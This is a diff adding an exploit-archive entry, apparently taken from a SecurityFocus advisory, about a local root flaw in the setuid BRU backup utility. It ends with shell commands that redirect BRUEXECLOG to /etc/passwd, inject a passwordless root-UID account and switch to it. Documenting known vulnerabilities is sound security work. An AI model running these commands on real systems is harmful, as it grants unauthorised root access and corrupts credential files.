@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/1321/info
+
+A vulnerability exists in BRU, the Backup and Restore Utility, from Enhanced Software Technologies. By setting the value of the BRUEXECLOG environment variable, it is possible to an attack to alter and create files on the filesystem. As BRU is installed setuid, these files are owned by root. This vulnerability can be easily used by local users to obtain root privileges.
+
+$ BRUEXECLOG=/etc/passwd
+$ export BRUEXECLOG
+$ bru -V '
+> comsec::0:0::/:/bin/sh
+> '
+$ su comsec
+# 
